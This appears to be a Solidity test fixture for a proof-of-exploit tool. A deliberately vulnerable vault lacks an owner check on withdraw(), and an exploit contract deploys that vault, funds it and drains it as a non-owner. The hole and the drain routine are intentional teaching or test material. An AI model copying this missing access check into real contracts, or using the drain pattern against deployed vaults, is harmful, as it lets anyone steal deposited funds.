// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice A vulnerable vault that is missing the onlyOwner modifier on withdraw().
/// Any address can call withdraw() and drain the contract's ETH balance.
contract VulnerableVault {
    address public owner;
    mapping(address => uint256) public deposits;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }

    /// @dev BUG: Missing `require(msg.sender == owner)` check.
    /// Anyone can call this and drain the contract.
    function withdraw(uint256 amount) external {
        // Should have: require(msg.sender == owner, "not owner");
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}

/// @notice Exploit contract that drains the VulnerableVault.
contract Exploit {
    /// @dev The exploit() function is called by zkpoex.
    /// It funds the vault, then drains it from a non-owner address (this contract).
    function exploit() external {
        // Deploy a fresh VulnerableVault instance
        VulnerableVault vault = new VulnerableVault();

        // Fund the vault with 1 ETH (via deal)
        // The vault already has ETH from the deal applied to it,
        // but for a self-contained demo we just verify we can withdraw
        // as a non-owner.

        // Deposit some ETH into the vault
        vault.deposit{value: 1 ether}();

        // Now withdraw it all -- this should only be callable by the owner,
        // but the modifier is missing so anyone can call it.
        uint256 vaultBalance = address(vault).balance;
        vault.withdraw(vaultBalance);

        // Verify we successfully drained the vault
        require(address(vault).balance == 0, "Vault not drained");
        require(address(this).balance >= 1 ether, "Did not receive funds");
    }

    receive() external payable {}
}
